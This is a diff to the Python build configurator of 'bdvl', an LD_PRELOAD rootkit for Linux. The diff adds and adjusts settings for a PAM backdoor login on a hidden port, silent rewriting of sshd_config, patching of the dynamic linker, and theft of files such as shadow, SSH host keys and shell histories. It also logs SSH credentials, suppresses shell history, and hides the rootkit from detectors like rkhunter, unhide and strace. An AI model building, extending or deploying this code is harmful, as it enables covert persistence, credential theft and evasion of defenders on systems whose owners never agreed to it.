@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 
-
 # SETTINGS
 
 # by default the password & port are random values. you can change this.
@@ -8,24 +7,35 @@ BD_UNAME = 'changeme'
 BD_PWD   = None
 PAM_PORT = None
 
+# the following settings are for patching of /etc/ssh/sshd_config to make sure that our PAM backdoor stays accessible.
+# HARD_PATCH_SSHD_CONFIG is the original method. this method makes sure the file itself stays the way we want.
+# SOFT_PATCH_SSHD_CONFIG is the better method. when sshd is reading sshd_config, it reads what we say it should read.
+# the arrays are in order respectively of each other. not that even matters much..it will when/if there are more settings
+# to take care of.
+HARD_PATCH_SSHD_CONFIG = False
+SOFT_PATCH_SSHD_CONFIG = True
+PATCH_TARGETS = ['PasswordAuthentication', 'UsePAM']  #  target settings to keep on top of...
+ANTIVAL    = ['no', 'no']          # what they shouldn't/can't be.
+TARGETVAL  = ['yes', 'yes']        # what they will be now.
 
-PATCH_SSHD_CONFIG = True # makes sure the PAM backdoor stays accessible by hijacking sshd_config.
 
 READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
 AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (30 min)
 GID_CHANGE_MINTIME = 60 * 30
+
 HIDE_MY_ASS      = True     # keep track of hidden things outside of the rootkit's directories. for rehiding upon a GID change.
+UNINSTALL_MY_ASS = True     # when running `./bdv uninstall`, bdvl will remove all of the hidden paths kept track of by HIDE_MY_ASS.
 CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when no rootkit processes are up.
 
 LOG_LOCAL_AUTH = True   # log successful auths for users on the box.
 LOG_SSH        = True   # log outgoing ssh login attempts.
 
+
 # "steal" files that may be of interest. they will be updated if there are changes in size.
 # wildcards for filenames work too..the files are stolen in the user's process so we're not modifying access times.
 FILE_STEAL = True
-MAX_FILE_SIZE      = (1024 * 1024) * 5   # don't try to steal files bigger than 5mb. set to None to disable limit. keep in mind memory is allocated for the target file.
-CLEAN_STOLEN_FILES = True                # remove stolen files every `FILE_CLEANSE_TIMER` seconds.
-FILE_CLEANSE_TIMER = (60 * 60) * 24      # remove stolen files once each day. you may want to change this depending on frequently you think files will be stolen & how big you think they could be.
+MAX_FILE_SIZE      = (1024 * 1024) * 20   # don't try to steal files bigger than 20mb. set to None to disable limit. memory is allocated in chunks for target files.
+FILE_CLEANSE_TIMER = (60 * 60) * 24       # remove stolen files once each day. you may want to change this value...set to None to disable this.
 INTERESTING_FILES  = ['passwd',                     'shadow',                 'sshd_config',
                       'ssh_config',                 'ssh_host_dsa_key',       'ssh_host_dsa_key.pub',
                       'ssh_host_ecdsa_key',         'ssh_host_ecdsa_key.pub', 'ssh_host_ed25519_key',
@@ -33,8 +43,17 @@ INTERESTING_FILES  = ['passwd',                     'shadow',                 's
                       'apache.log', 'known_hosts',  '.bash_history',
                       '*.txt', '*.sql',   '*.php', '*.zip',
                       '*.tar', '*.tar.*', '*.rar', '*.db']
+# stolen files are read & written in chunks. these are the relative settings.
+BLOCKS_COUNT   = 10       # the default value for how many chunks files contents will be divided into.
+MAX_BLOCK_SIZE = 1024*40  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 40kb default. set to None to disable.
 
-USE_CRYPT = True
+# when copying the file fails, or it exceeds MAX_FILE_SIZE, link it instead of copying it.
+SYMLINK_FALLBACK = True
+
+
+# patch the dynamic linker libraries as to overwrite the original /etc/ld.so.preload path with our own.
+# setting to False will instruct the rootkit to use /etc/ld.so.preload instead.
+PATCH_DYNAMIC_LINKER = True
 
 
 # END OF SETTINGS
@@ -42,9 +61,26 @@ USE_CRYPT = True
 
 # other random stuff
 
+
 # bdvl will unset these environment variables in its processes.
 unsetvars = ['HISTFILE', 'SAVEHIST', 'TMOUT', 'PROMPT_COMMAND']
 
+# valid package managers available from `./bdv <pkgman>`
+validpkgmans = ['apt', 'yum', 'pacman', 'emerge']
+
+# things to hide from. the rootkit is uninstalled during the runtime of either,
+#    a. processes with certain environment variables set,
+#    b. processes that need to access certain paths,
+#    c. or just processes whose names match those below.
+scary_variables = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG', 'LD_AUDIT']
+scary_paths = ['*/*ld-linux*.so.*', '*ld-linux*.so.*', '*/*ld-*.so', '*ld-*.so']
+scary_procs = ['lsrootkit', 'ldd', 'unhide', 'rkhunter', 'chkproc', 'chkdirs', 'ltrace', 'strace']
+
+# valid platforms for target shared object when installing. (`./bdvinstall [path]...`)
+valid_platforms = ['x86_64', 'i686', 'v6l', 'v7l']
+
+ldpaths = ['/lib/ld-linux.so.2', '/lib/ld-linux.so.3', '/lib/ld-linux-armhf.so.3', '/lib32/ld-2.31.so',
+           '/lib32/ld-linux.so.2', '/lib64/ld-linux-x86-64.so.2']
 
 
 
@@ -55,7 +91,7 @@ from base64 import b64encode
 from string import ascii_uppercase, ascii_lowercase, digits
 from random import choice
 from os import listdir, system, unlink
-from os.path import join, basename
+from os.path import join, basename, isdir, dirname
 from binascii import hexlify
 
 
@@ -92,8 +128,9 @@ class Util():
     def randpaths(self, count):
         allpaths = []
         for i in range(count):
-            maxlen = choice(range(2, 5))
-            allpaths.append(self.randpath())
+            maxlen = choice(range(4, 8))
+            thispath = self.randpath(maxlen)
+            allpaths.append(thispath)
         return allpaths
 
 
@@ -114,18 +151,6 @@ class Definitions():
         c_def = c_def.format(name, val)
         return c_def
 
-    # creates a bunch of string definitions based on data
-    # in target array. not used & not needed, but kept.
-    def getdefs(self):
-        all_defs = ''
-        for i in range(self.list_len):
-            our_name = self.array_list[i][0]
-            our_value = self.array_list[i][1]
-
-            this_def = self.gettcdef(our_name, our_value)
-            all_defs += this_def
-        return all_defs
-
     # returns a new identifier definition based on name & index.
     # where index is the current index of the target array.
     def getident(self, nam, index):
@@ -145,48 +170,39 @@ class Definitions():
 
 # handy class. trusty class. thank you class.
 class CArray(): # default is assumed to be an array of char pointers
-    def __init__(self, name, alist, arrtype='charp'):
-        self.array_name = name
-        self.size_name = name.upper() + '_SIZE'
+    def __init__(self, name, alist, arrtype='char*'):
+        self.name = name
+        self.sizen = name.upper() + '_SIZE'
         self.list_len = len(alist)
         self.array_list = alist
         self.arrtype = arrtype
 
+        # 0=data type,1=arrayname,2=sizename
+        self.typeformat = 'static {0} const {1}[{2}] = '.format(self.arrtype, self.name, self.sizen)
+
     # define size of the array to be created.
     def getsizedef(self):
         size_def = '#define {0} {1}\n'
-        size_def = size_def.format(self.size_name, self.list_len)
+        size_def = size_def.format(self.sizen, self.list_len)
         return size_def
 
-    # setup the beginning of the array.
-    def declarecharparray(self):
-        declaration = 'static char *const {0}[{1}] = '
-        declaration = declaration.format(self.array_name, self.size_name)
-        return declaration
-
-    def declarechararray(self):
-        declaration = 'static char const {0}[{1}] = '
-        declaration = declaration.format(self.array_name, self.size_name)
-        return declaration
+    def declarearray(self):
+        return self.typeformat
 
     # build elements of target array.
     def buildelems(self, elems='{'):
         for elem in self.array_list:
-            if self.arrtype == 'charp':
+            if self.arrtype == 'char*':
                 elems += '"{0}",'.format(elem)
             else:
                 elems += '{0},'.format(elem)
-        elems = elems[:-1]  # remove trailing comma.
-        elems += '};\n'
+        elems = elems[:-1] + '};\n'
         return elems
 
     # create full C array.
     def create(self):
         result = self.getsizedef()
-        if self.arrtype == 'charp':
-            result += self.declarecharparray()
-        elif self.arrtype == 'char':
-            result += self.declarechararray()
+        result += self.declarearray()
         result += self.buildelems()
         return result
 
@@ -206,9 +222,12 @@ if BD_PWD == None:
 if PAM_PORT == None:
     PAM_PORT = choice(range(11111, 63556))
 
+# ideally there will be more in here... ports in here are hidden & cannot be unhidden.
+bdvlports = [PAM_PORT]
+
 print('Username: ' + BD_UNAME)
 print('Password: ' + BD_PWD)
-print('Hidden port: ' + str(PAM_PORT))
+print('Hidden ports: ' + str(PAM_PORT))
 
 MAGIC_GID = choice(range(22222222, 66666666))
 
@@ -216,31 +235,33 @@ INSTALL_DIR = ut.randpath(7)
 HOMEDIR = ut.randpath(7)
 BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
 SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
+OLD_PRELOAD = '/etc/ld.so.preload'
 
 CLEANEDTIME_PATH = ut.randpath(7)
-if CLEAN_STOLEN_FILES == False or FILE_CLEANSE_TIMER == None:
+if FILE_CLEANSE_TIMER == None:
     CLEANEDTIME_PATH = None
 
 INC      = 'inc'
 NEW_INC  = 'new_inc'
 CONFIGH      = NEW_INC + '/config.h'
 HOOKS_PATH   = NEW_INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
-SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads stuff from here to install the kit.
+SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads BDVLSO from here.
 
 BDVLH = NEW_INC + '/bedevil.h'
-SETTINGS = { # all of these are written to bedevil.h
+SETTINGS = { # all of these are written to bedevil.h. if a value is None it is skipped.
     'BD_UNAME':BD_UNAME,                  'BD_PWD':ut.cryptpw(BD_PWD),
-    'MAGIC_GID':int(MAGIC_GID),           'BD_VAR':ut.randgarb(ascii_uppercase, 9),
+    'MAGIC_GID':MAGIC_GID,                'BD_VAR':ut.randgarb(ascii_uppercase, 9),
     'INSTALL_DIR':INSTALL_DIR,            'HOMEDIR':HOMEDIR,
     'BDVLSO':BDVLSO,                      'SOPATH':SOPATH,
     'PRELOAD_FILE':ut.randpath(10),       'SSH_LOGS':ut.randpath(7),
     'INTEREST_DIR':ut.randpath(7),        'HIDEPORTS':ut.randpath(7),
     'GID_PATH':ut.randpath(5),            'GIDTIME_PATH':ut.randpath(5),
-    'PAM_PORT':int(PAM_PORT),             'SSHD_CONFIG':'/etc/ssh/sshd_config',
+    'PAM_PORT':PAM_PORT,                  'SSHD_CONFIG':'/etc/ssh/sshd_config',
     'LOG_PATH':ut.randpath(7),            'ASS_PATH':ut.randpath(7),
     'MAX_FILE_SIZE':MAX_FILE_SIZE,        'BASHRC_PATH':HOMEDIR+'/.bashrc',
     'PROFILE_PATH':HOMEDIR+'/.profile',   'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER,
-    'CLEANEDTIME_PATH':CLEANEDTIME_PATH
+    'CLEANEDTIME_PATH':CLEANEDTIME_PATH,  'OLD_PRELOAD':OLD_PRELOAD,
+    'BLOCKS_COUNT':BLOCKS_COUNT,          'MAX_BLOCK_SIZE':MAX_BLOCK_SIZE
 }
 
 # the following paths are linked to within the installation directory.
@@ -254,21 +275,25 @@ LINKPATHS = {
 # these must be checked & based on the values, subsequently written to config.h
 # so that the kit knows what stuff to do & what not to do.
 CHECKTHESE = {
-    'PATCH_SSHD_CONFIG':PATCH_SSHD_CONFIG,   'READ_GID_FROM_FILE':READ_GID_FROM_FILE,
-    'AUTO_GID_CHANGER':AUTO_GID_CHANGER,     'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,
-    'HIDE_MY_ASS':HIDE_MY_ASS,               'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,
-    'LOG_SSH':LOG_SSH,                       'FILE_STEAL':FILE_STEAL,
-    'USE_CRYPT':USE_CRYPT,                   'CLEANSE_HOMEDIR':CLEANSE_HOMEDIR,
-    'CLEAN_STOLEN_FILES':CLEAN_STOLEN_FILES
+    'HARD_PATCH_SSHD_CONFIG':HARD_PATCH_SSHD_CONFIG,   'READ_GID_FROM_FILE':READ_GID_FROM_FILE,
+    'AUTO_GID_CHANGER':AUTO_GID_CHANGER,               'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,
+    'HIDE_MY_ASS':HIDE_MY_ASS,                         'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,
+    'LOG_SSH':LOG_SSH,                                 'FILE_STEAL':FILE_STEAL,
+    'CLEANSE_HOMEDIR':CLEANSE_HOMEDIR,                 'SYMLINK_FALLBACK':SYMLINK_FALLBACK,
+    'UNINSTALL_MY_ASS':UNINSTALL_MY_ASS,               'SOFT_PATCH_SSHD_CONFIG':SOFT_PATCH_SSHD_CONFIG,
+    'PATCH_DYNAMIC_LINKER':PATCH_DYNAMIC_LINKER
 }
 
-TOGGLE_PATHS = {  # there are paths that go along with said toggles. they're needed.
+# paths that belong to toggles. here paths suffixed with a '/' are treated as directories
+# by the rootkit. upon logging into the backdoor, if these paths do not exist they are
+# created. this saves auto.sh some work.
+TOGGLE_PATHS = {
     SETTINGS['SSH_LOGS']:LOG_SSH,
     SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
     SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
     SETTINGS['LOG_PATH']:LOG_LOCAL_AUTH,
     SETTINGS['ASS_PATH']:HIDE_MY_ASS,
-    SETTINGS['INTEREST_DIR']:FILE_STEAL,
+    SETTINGS['INTEREST_DIR']+'/':FILE_STEAL,
     SETTINGS['CLEANEDTIME_PATH']:CLEANEDTIME_PATH
 }
 
@@ -277,6 +302,7 @@ NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
     SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
     SETTINGS['INSTALL_DIR']:True,
     SETTINGS['PRELOAD_FILE']:True,
+    SETTINGS['OLD_PRELOAD']:True,
     SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
     SETTINGS['HIDEPORTS']:True,
     SETTINGS['SSH_LOGS']:LOG_SSH,
@@ -320,18 +346,6 @@ def gethooks():
 
     return allhooks
 
-
-def setupcfg():
-    # these are settings that auto.sh must be able to read & use to install the kit.
-    targets = ['MAGIC_GID', 'INSTALL_DIR', 'HOMEDIR', 'PRELOAD_FILE', 'BDVLSO',
-               'SOPATH', 'HIDEPORTS', 'SSH_LOGS', 'INTEREST_DIR',
-               'BD_VAR', 'GID_PATH', 'GIDTIME_PATH', 'LOG_PATH',
-               'ASS_PATH']
-
-    fd = open(SETTINGS_CFG, 'w')
-    fd.write('\n'.join(str(SETTINGS[target]) for target in targets))
-    fd.close()
-
 def checktoggles(keys, values):
     count = len(keys)
     okhere = ''
@@ -341,25 +355,23 @@ def checktoggles(keys, values):
     return okhere
 
 # hex the contents of a path & return it as a char array.
-def hexarraylifypath(path, arrname, sizedef):
+def hexarraylifypath(path, arrname):
     fd = open(path, 'rb')
     contents = fd.read()
     fd.close()
 
     contentshex = hexlify(contents)
-    contentslist = ['0x' + contentshex[i:i+2] for i in range(0, len(contentshex), 2)]
+    contentslist = ['0x'+contentshex[i:i+2] for i in range(0, len(contentshex), 2)]
     contentsarr = CArray(arrname, contentslist, arrtype='char')
     return contentsarr.create()
 
 def listconditional(dictlist):
     keys   = list(dictlist.keys())
     values = list(dictlist.values())
-
     goodkeys = []
     for i in range(len(keys)):
-        if values[i] == False:
-            continue
-        goodkeys.append(keys[i])
+        if values[i] == True:
+            goodkeys.append(keys[i])
     return goodkeys
 
 def setup_config():
@@ -394,32 +406,20 @@ def setup_config():
                 break
 
         if value == None or skip == True:
-            continue
-
-        # if the target setting is a port, add it into the hideports file.
-        targettok = target.split('_')
-        if 'PORT' in targettok:
-            fd = open(NEW_INC+'/hideports', 'a')
-            fd.write(str(value)+'\n')
-            fd.close()                
+            continue             
 
         try:
             gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
+            gotbdvlh += '#define _{0}LEN {1}\n'.format(target, len(str(value)))
         except:
             gotbdvlh += '#define {0} {1}\n'.format(target, str(value))
 
     defs = Definitions(ALL_HOOKS)
     gotbdvlh += defs.getidents()
 
-    allhooksarr = CArray('all', ALL_HOOKS)
-    gotbdvlh += allhooksarr.create()
-    gotbdvlh += 'syms symbols[ALL_SIZE];\n'
-
     fd = open('etc/.rolf', 'r')
     rolf = fd.read().strip().split('\n')
     fd.close()
-    rolfarr = CArray('rolfs', rolf)
-    gotbdvlh += rolfarr.create()
 
     if FILE_STEAL == True:
         bashrcarr = CArray('interesting_files', INTERESTING_FILES)
@@ -438,32 +438,49 @@ def setup_config():
         link = link.split(':')
         linksrc.append(link[0])
         linkdest.append(link[1])
-    linksrcs = CArray('linksrcs', linksrc)
-    linkdests = CArray('linkdests', linkdest)
-    gotbdvlh += linksrcs.create() + linkdests.create()
 
-    #unset_variables
-    arrunsetvars = CArray('unsetvars', unsetvars)
-    gotbdvlh += arrunsetvars.create()
+    bdvlarrays = { # write all of these lists to bedevil.h as arrays of char pointers
+        'linksrcs':linksrc,                 'linkdests':linkdest,
+        'unsetvars':unsetvars,              'togpaths':listconditional(TOGGLE_PATHS),
+        'notrack':listconditional(NOTRACK), 'validpkgmans':validpkgmans,
+        'scary_variables':scary_variables,  'scary_paths':scary_paths,
+        'scary_procs':scary_procs,          'valid_platforms':valid_platforms,
+        'rolfs':rolf,                       'all':ALL_HOOKS,
+        'ldpaths':ldpaths
+    }
 
-    togpathslist = listconditional(TOGGLE_PATHS)
-    arrtogpaths = CArray('togpaths', togpathslist)
-    gotbdvlh += arrtogpaths.create()
+    arraynames = list(bdvlarrays.keys())
+    targetarrays = list(bdvlarrays.values())
+    for i in range(len(arraynames)):
+        thisarr = CArray(arraynames[i], targetarrays[i])
+        gotbdvlh += thisarr.create()
 
-    notracklist = listconditional(NOTRACK)
-    arrnotrack = CArray('notrack', notracklist)
-    gotbdvlh += arrnotrack.create()
+    bdvlportsarr = CArray('bdvlports', bdvlports, arrtype='int')
+    gotbdvlh += bdvlportsarr.create()
 
-    # bedevil.h complete. write it.
+    if SOFT_PATCH_SSHD_CONFIG == True or HARD_PATCH_SSHD_CONFIG == True:
+        patchlists = {'patchtargets':PATCH_TARGETS, 'antival':ANTIVAL,
+                      'targetval':TARGETVAL}
+        patchkeys = list(patchlists.keys())
+        patchvals = list(patchlists.values())
+        for i in range(len(patchkeys)):
+            thisarr = CArray(patchkeys[i], patchvals[i])
+            gotbdvlh += thisarr.create()
+
+    gotbdvlh += 'syms symbols[ALL_SIZE];\n'
+
+    # done.
     fd = open(BDVLH, 'w')
     fd.write(gotbdvlh)
     fd.close()
 
-    # write all the settings auto.sh needs.
-    setupcfg()
+    # auto.sh stuff
+    fd = open(SETTINGS_CFG, 'w')
+    fd.write(SETTINGS['BDVLSO']+'\n')
+    fd.close()
 
     # mk tar.gz of include dir. b64 it. rm it.
-    system('tar cpfz {0}.tar.gz {1}'.format(BD_UNAME, NEW_INC))
+    system('tar cpfz {0}.tar.gz {1}/'.format(BD_UNAME, NEW_INC))
     fd = open(BD_UNAME+'.tar.gz', 'rb')
     targzb64 = b64encode(fd.read())
     fd.close()
